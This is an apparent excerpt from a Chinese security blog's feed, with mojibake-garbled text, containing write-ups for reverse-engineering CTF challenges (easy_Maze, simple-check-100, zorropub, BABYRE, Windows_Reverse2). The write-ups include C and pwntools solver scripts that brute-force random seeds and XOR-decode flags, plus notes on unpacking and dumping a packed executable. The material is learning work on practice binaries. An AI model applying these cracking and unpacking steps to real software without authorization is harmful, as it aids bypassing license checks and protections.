class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> (*p)[<span class="number">7</span>] = (<span class="keyword">int</span> (*)[<span class="number">7</span>])A.a;  <span class="comment">// å¼ºåˆ¶è½¬åŒ–ä¸ºæ•°ç»„æŒ‡é’ˆ, æ–¹ä¾¿åé¢æ‰“å°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">7</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, p[i][j]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200506201841271-1592290342688.png" alt="image-20200506201841271"></p></li><li><p>æ ¹æ®æˆ‘ä»¬æ‰“æ¸¸æˆçš„ç†Ÿæ‚‰ aswd ,æœç€1èµ°åˆ°æœ€å.  <strong>ssddwdwdddsssaasasaaassddddwdds</strong> æœ€ååœ¨linuxä¸‹è¾“å…¥.</p><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200504140433640-1592290514404.png" alt="image-20200504140433640"></p></li><li><p><strong>æ€»ç»“: æ›´åŠ ç†Ÿæ‚‰äº†linuxåŠ¨æ€è°ƒè¯•çš„è¿ç”¨,  åŠ æ·±äº†æ•°ç»„æŒ‡é’ˆçš„ç†è§£.</strong></p></li></ul><hr><h2 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h2><ul><li><p>é¢˜ç›®æœ¬æ¥å¾ˆç®€å•, ä½†æ˜¯æœ‰å‘å•Šâ€¦</p></li><li><p>é¦–å…ˆ, é¢˜ç›®ä¸‹è½½ä¸‹æ¥, æœ‰ä¸‰ä¸ªç‰ˆæœ¬. ä¸‹æ„è¯†çš„é€‰æ‹©äº†ç†Ÿæ‚‰çš„.exeæ¥åˆ†æ. </p></li><li><p>æŸ¥å£³æ— å£³, ç”¨idaæ‰“å¼€. ç¬¬ä¸€ç›´è§‰å°±æ˜¯è¿™ä¸ªæœ€åçš„flagä¸æˆ‘ä»¬è¾“å…¥å­—ç¬¦æ²¡å…³ç³», ç›´æ¥ODåŠ¨æ€è°ƒè¯•è·³è¿‡åˆ¤æ–­æ¡ä»¶å°±å¥½äº†.</p></li><li><p>è¿˜æ˜¯å…ˆç»†çœ‹ä¸€ä¸‹æ ˆç©ºé—´, è™½ç„¶è¿˜æ˜¯å’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ²¡æœ‰å…³ç³». ä½†æ˜¯æœ‰é—®é¢˜å•Š,è¦ç”¨çš„åœ°å€äº¤å‰äº†.  æƒ³ç€ä¸‡ä¸€é¢˜å°±æ˜¯è¿™æ ·å‘¢, å…ˆå–ODè¯•ä¸€ä¸‹. ä¸å‡ºæ‰€æ–™, ä¹±ç ğŸ˜¢ </p></li><li><p>å¼€å§‹ä»”ç»†åˆ†æä¸‹è¿™ä¸ªé¢˜çš„æ ˆç©ºé—´, åœ¨ODåå¤è°ƒè¯•, å‘ç°æˆ‘ä»¬è¾“å…¥å­—ç¬¦çš„ç©ºé—´åªæœ‰19ä¸ªå­—èŠ‚å•Š, ä¸ºä»€ä¹ˆæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ ˆç©ºé—´åœ¨ODä¸­è°ƒè¯•æœ‰19+32 = 51å­—èŠ‚ç©ºé—´.</p><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200506144401943-1592290592390.png" alt="image-20200506144401943"></p></li><li><p>çœ‹äº†åŠå¤©ä¸çŸ¥é“ä¸ºä»€ä¹ˆ, åé¢æ‰çœ‹è§ç¨‹åºä¸‹é¢æœ‰  <strong>v3 = alloca(32);</strong> ç™¾åº¦äº†ä¸€ä¸‹, è¿™ä¸ªæ˜¯å†æ ˆä¸Šç”³è¯·ç©ºé—´çš„å‡½æ•°. æ­£å¥½æ˜¯å¤šå‡ºæ¥çš„32. </p></li><li><p>ç»è¿‡åå¤è°ƒè¯•, è¿™ä¸ªé¢˜æ€ä¹ˆä¹Ÿå’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ²¡å…³ç³»å•Š, ç¨‹åºæ¯æ¬¡è¿‡äº†åˆ¤æ–­æ¡ä»¶, ç®—çš„éƒ½ä¸€æ ·. çœŸçš„å¥‡æ€ªäº†.</p></li><li><p>æœ€åæ²¡åŠæ³•äº†,æƒ³ä¸é€š.  å°±æœ€åå†æŠŠæ–‡ä»¶ä¸­è¿™ä¸ªç¨‹åºçš„linuxç‰ˆæœ¬è½½å…¥idaçœ‹çœ‹,  å—¯â€¦.è¿™ä¸ªç‰ˆæœ¬çš„æ ˆç©ºé—´å°±æ²¡æœ‰äº¤å‰. v7ä¸€ç›´åˆ°v34, æ²¡æœ‰åƒPEæ–‡ä»¶é‚£ä¸ªç‰ˆæœ¬åœ¨ä¸­é—´å¤šä¸€ä¸ªæŒ‡é’ˆ.<img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200506145151730-1592290606770.png" alt="image-20200506145151730"></p></li><li><p>åœ¨linuxä¸‹åŠ¨æ€è°ƒè¯•.<img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200506145627945-1592290617965.png" alt="image-20200506145627945"></p></li><li><p>ğŸ˜‚ä»€ä¹ˆé¬¼é¢˜. PEæ–‡ä»¶ç‰ˆæœ¬å±…ç„¶æ˜¯æœ‰é—®é¢˜çš„!!!</p></li><li><p><strong>æ€»ç»“: æ–‡ä»¶æœ‰å¤šä¸ªç‰ˆæœ¬çš„æ—¶å€™, æ³¨æ„!!! å¼ è§è¯†äº†. è™½ç„¶å¤šèŠ±äº†æ—¶é—´åœ¨PEä¸Šè€—, ä½†æ˜¯å¯¹æ ˆæ›´æ¸…æ¥šäº†.</strong></p></li></ul><hr><h2 id="zorropub"><a href="#zorropub" class="headerlink" title="zorropub"></a>zorropub</h2><ul><li><p>æŸ¥å£³æŸ¥ä½æ•°åè½½å…¥ida, æ•´ä½“æ€è·¯å¦‚ä¸‹.<img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200508104152981-1592290667231.png" alt="image-20200508104152981"></p></li><li><p>é‚£å…¶å®æˆ‘ä»¬æ˜¯ä¸ç”¨ç®¡è¿™ä¸ª MD5 åŠ å¯†çš„ , ä¹Ÿä¸ä¼šè¿™ä¸ªè§£å¯†.  ç›´æ¥çˆ†ç ´æ‰¾åˆ° <strong>i</strong> å€¼ä»è€Œå¾—åˆ°éšæœºæ•°ç§å­.</p></li><li><p>é‚£é—®é¢˜æ¥äº†, çˆ†ç ´æ‰¾äº†ä¸€ä¸ª <strong>i</strong> å€¼æ˜¯1023, å°±åœ¨linuxå†™äº†exp(<strong>ä¸èƒ½åœ¨windowä¸‹, å› ä¸ºç”Ÿæˆéšæœºæ•°ä¸åŒ</strong>). ä½†å¾—åˆ°çš„æ•°æ®éƒ½æ˜¯ä¹±ç çš„, æˆ‘è¿˜æ˜¯ä¸€ç›´ä»¥ä¸ºé—®é¢˜å‡ºç°åœ¨ <strong>LOBYTE(å–æœ€ä½å­—èŠ‚ä½)</strong> å› ä¸ºç¬¬ä¸€æ¬¡æ¥è§¦. </p></li><li><p>æœ€åæ‰æƒ³èµ·é‚£ä¸ª <strong>i</strong> çš„å€¼, å®ƒå¯èƒ½ä¸æ˜¯å”¯ä¸€çš„. å¼€å§‹å†™exp, å–å¤§èŒƒå›´çš„æ•°æ®çˆ†ç ´, æœç„¶å¯¹äº†â€¦â€¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">srand(a);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                b = rand()%<span class="number">1000</span>;</span><br><span class="line">                flag[i] = b^c[<span class="number">4</span>*i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag[i] &gt; <span class="number">126</span> || flag[i] &lt; <span class="number">32</span>)</span><br><span class="line">f = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!f)</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, b = <span class="number">0</span>, j = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000</span>] = &#123;</span><br><span class="line">  <span class="number">200</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">50</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">206</span>,   <span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">  <span class="number">184</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">126</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">163</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">150</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">64</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">40</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">252</span>,   <span class="number">2</span>,</span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">142</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">38</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">42</span>,   <span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">245</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">95</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">  <span class="number">104</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">235</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">121</span>,   <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">29</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">78</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = i;</span><br><span class="line"><span class="keyword">while</span>(j)</span><br><span class="line">&#123;</span><br><span class="line">cnt++;</span><br><span class="line">j &amp;= j<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt == <span class="number">10</span>)</span><br><span class="line">func(i,  a);</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200508105155224-1592290710459.png" alt="image-20200508105155224"></p></li><li><p>ç„¶ååšå®Œ, è¿˜æ˜¯å»çœ‹çœ‹å¤§ä½¬çš„writeup. æƒ³çœ‹çœ‹é‚£ä¸ªmd5æ€è§£å¯†, ä½†æ˜¯æ²¡æœ‰.  å´å‘ç°å¥½å¤šéƒ½æ˜¯ç”¨çš„pwntoolså·¥å…·æ¥çˆ†ç ´çš„, è‡ªå·±ä¹Ÿå»è¯•äº†ä¸‹, ç¡®å®ç®€å•å¾ˆå¤š.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">a = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>, <span class="number">0xffff</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    j = i</span><br><span class="line">    <span class="keyword">while</span>(j):</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        j &amp;= j<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> cnt == <span class="number">10</span>:</span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p = process(<span class="string">"./11"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">    ans = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"NULL"</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">print</span> (text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure></li><li><p><strong>æ€»ç»“: (1)æ—¢ç„¶æ˜¯çˆ†ç ´å°±è¦æ³¨æ„æœ‰å¤šç§æƒ…å†µ (2) LOBYTE æ˜¯idaçš„å®å®šä¹‰, å–æœ€ä½å­—èŠ‚ä½. (3)æ›´åŠ ç†Ÿæ‚‰pwntoolså·¥å…·çš„ä½¿ç”¨.</strong></p></li></ul><hr><h2 id="BABYRE"><a href="#BABYRE" class="headerlink" title="BABYRE"></a>BABYRE</h2><ul><li><p>é¢˜ç›®ä¸éš¾, ä½†æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°è¿™æ ·çš„é¢˜.</p></li><li><p>64ä½elfæ–‡ä»¶, idaæ‰“å¼€å, å’Œä»¥å¾€çš„æ–‡ä»¶ä¸ä¸€æ ·, å¼€å§‹æœ‰ä¸€æ®µå¾ªç¯è®¡ç®—èµ‹å€¼çš„æ“ä½œ,ä½†æ˜¯åˆæ˜¯çœ‹ä¸åˆ°åˆ°åº•æ˜¯èµ‹å€¼ç»™äº†è°.<img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200512134025680-1592290738761.png" alt="image-20200512134025680"></p></li><li><p>é‚£å°±åŠ¨æ€è°ƒè¯•è·Ÿæ¥çœ‹çœ‹, åˆ°äº†åˆ¤æ–­æ¡ä»¶çš„æ—¶å€™. æ˜ç™½äº†å°±æ˜¯ç±»ä¼¼åŠ å£³çš„ç¨‹åºæ‰“å¼€ä¼šå…ˆè¿›è¡Œè§£å‹ç”Ÿæˆä»£ç . è¿™é‡Œå¼€å§‹é‚£ä¸€æ®µå¾ªç¯ä½œç”¨, å°±æ”¹å˜æˆ‘ä»¬ä»£ç çš„.</p></li><li><p>è·Ÿè¿›åˆ¤æ–­å‡½æ•°, ç®—æ³•å¾ˆç®€å•,ç›´æ¥è¯»æ±‡ç¼–,  å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–æ“ä½œç„¶åå¯¹æ¯”. </p><p><img src="/2020/05/03/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%883%EF%BC%89/image-20200512133918795-1592290773581.png" alt="image-20200512133918795"></p></li><li><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x6B</span>, <span class="number">0x37</span>, <span class="number">0x64</span>,  <span class="number">0x3B</span>, <span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x3B</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = a[i] ^ i; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>æ€»ç»“: ç®—æ˜¯é•¿è§è¯†å§.</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;easy-Maze&quot;&gt;&lt;a href=&quot;#easy-Maze&quot; class=&quot;headerlink&quot; title=&quot;easy_Maze&quot;&gt;&lt;/a&gt;easy_Maze&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;è¿™é“é¢˜å¯¹æ–°æ‰‹è¿˜æ˜¯å¾ˆå¥½. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç”±é¢˜ç›®æˆ‘ä»¬èƒ½çŸ¥é“æ˜¯å…³äºè¿·å®«çš„é¢˜. ä¸‹è½½ä¸‹æ¥æ˜¯elfæ–‡ä»¶, æŸ¥å£³åæ— å£³, åœ¨linuxä¸‹è¿è¡Œçœ‹çœ‹å¤§æ¦‚æµç¨‹. &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è½½å…¥IDA, å…ˆåˆ†æäº†æ¥å—æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„å‡½æ•°.  çŸ¥é“åœ¨å¤–é¢ä¸€å±‚çš„ä¸»å‡½æ•°æ˜¯å…ˆç”Ÿæˆä¸€ä¸ªæ¯è¡Œ7ä¸ªå…ƒç´ çš„æ•°ç»„. ç„¶åé€šè¿‡æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æŒ‰æ§åˆ¶åœ¨çŸ©é˜µè¿·å®«ä¸­èµ°å‘, æœ€åæŒ‰ç…§è§„å®šçš„åˆ°è¾¾ä¸€ä¸ªç›®çš„åœ°.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>re æ”»é˜²ä¸–ç•Œï¼ˆ2ï¼‰</title>
    <link href="https://www.bxnop.cn/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/</id>
    <published>2020-04-29T06:53:15.000Z</published>
    <updated>2020-06-03T05:41:18.490Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows_Reverse2"></a>Windows_Reverse2</h2><ul><li><p>é¦–å…ˆ,å› ä¸ºæ˜¯ä¸ª.exeæ–‡ä»¶, å…ˆæ‰“å¼€çœ‹ä¸€ä¸‹ç¨‹åºæ˜¯åšä»€ä¹ˆçš„, å‡ºç° <strong>input code:</strong> ä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå¯†ç éªŒè¯.</p></li><li><p>ç”¨idaæ‰“å¼€, è¿˜æ˜¯å…ˆ shift + 12 æœç´¢ä¸€ä¸‹å­—ç¬¦ä¸², ç„¶è€Œå¹¶æ²¡æœ‰å‘ç°æˆ‘ä»¬æ‰“å¼€ç¨‹åºçœ‹åˆ°çš„ *<em>input code: *</em>,å¹¶ä¸”ç¨‹åºå‡½æ•°ä¹Ÿå¾ˆå°‘, é‚£å°±æ˜¯åŠ å£³äº†çš„. å¼€å§‹ä¹Ÿå¿˜äº†ç”¨è½¯ä»¶æŸ¥ä¸€ä¸‹å£³.</p></li><li><p>é‚£ä¹ˆç”¨ODæ‰“å¼€, ä½¿ç”¨å †æ ˆå¹³è¡¡çš„æ–¹æ³•, æ‰¾åˆ°ç¨‹åºçš„ OEP, ç„¶ådump, ä½†æ˜¯æ³¨æ„æ”¹ä¸€ä¸‹åŠ è½½çš„åˆå§‹åœ°å€å’Œå…¥å£ç‚¹,   è¿™ä¸ªç¨‹åºå¹¶ä¸æ˜¯ 0x400000å¼€å§‹, æ¯æ¬¡åŠ è½½éƒ½æ˜¯ä¸ä¸€æ ·çš„åœ°å€,åº”è¯¥æ˜¯ ASLRä¿æŠ¤æŠ€æœ¯å§, ä¹‹å‰æœ‰äº†è§£è¿‡ä¸€äº›.é€šè¿‡å†…å­˜çª—å£, çŸ¥é“äº†æ˜¯ 0x1F0000.<a id="more"></a></p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200429150859645-1591162094958.png" alt="image-20200429150859645"></p></li><li><p>dumpå‡ºå,ä½†æ˜¯æ‰“ä¸å¼€, ä¹‹å‰å­¦ä¹ è„±å£³æ—¶äº†è§£è¿‡,ä½†æ˜¯æ²¡æœ‰å®è·µ. å°±å»ä¸‹è½½<strong>import rec</strong>,ä½†æ‰“å¼€æ‰¾ä¸åˆ°æ¡Œé¢çš„æ–‡ä»¶,  è¯•äº†å¥½å‡ ä¸ªä¹Ÿä¸è¡Œ, ç™¾åº¦ä¹Ÿæ— æœ. ä¹Ÿä¸æƒ³ç”¨è„±å£³è½¯ä»¶,ä¸»è¦æƒ³æ“ä½œä¸€ä¸‹. å…¶å®å¯¹äºå»idaåç¼–è¯‘å·²ç»è¶³å¤Ÿäº†,å› ä¸ºé‚£ä¸ªåªæ˜¯ä¼šå½±å“åŠ¨æ€é“¾æ¥çš„å‡½æ•°.</p></li><li><p>idaå†æ¬¡æ‰“å¼€å, æ‰¾åˆ°ä¸»å‡½æ•°, è½¬æ¢ä¸ºä¼ªä»£ç , é€»è¾‘å¾ˆç®€å•, å°±æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å…ˆè¿›è¡Œåˆ¤æ–­,ç„¶åè¿›è¡ŒåŠ å¯†,ä¸ç¼–ç çš„å­—ç¬¦å¯¹æ¯”. å…ˆçœ‹åˆ¤æ–­å‡½æ•°.</p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200429152407648-1590489723012-1591162107894.png" alt="image-20200429152407648-1590489723012"></p></li><li><p>ç„¶åçœ‹å…³é”®çš„åŠ å¯†å‡½æ•°, å‘ç°æœ€ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªå‡½æ•° sub_A71000.</p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200429155217177-1590489885930-1591162119539.png" alt="image-20200429155217177-1590489885930"></p></li><li><p>sub_A7100, åˆšå¼€å§‹çœ‹è¿™ä¸ªå‡½æ•°è§‰å¾—å¾ˆéº»çƒ¦, ä½†æ˜¯ä»ä»¥å‰åšçš„é¢˜æ¥çœ‹, å¹¶ä¸”è¿™ä¸ªå‡½æ•°æœ‰ &gt;&gt; è¿ç®—ç¬¦. å¯ä»¥å¾€baseç¼–ç è€ƒè™‘, é‚£å°±å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰baseç¼–ç çš„æ ‡å¿—.</p><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200429160021209-1590489939494-1591162126116.png" alt="image-20200429160021209-1590489939494"></p></li><li><p>åˆ°äº†è¿™é‡Œ , å¯ä»¥çŸ¥é“, ç¨‹åºåªæ˜¯æ ‡å‡†ç æ¢äº†ä¸€ä¸‹. æˆ‘ä»¬å°±ç”¨ç¨‹åºç¼–ç çš„æ•°æ®å’Œ 0x76 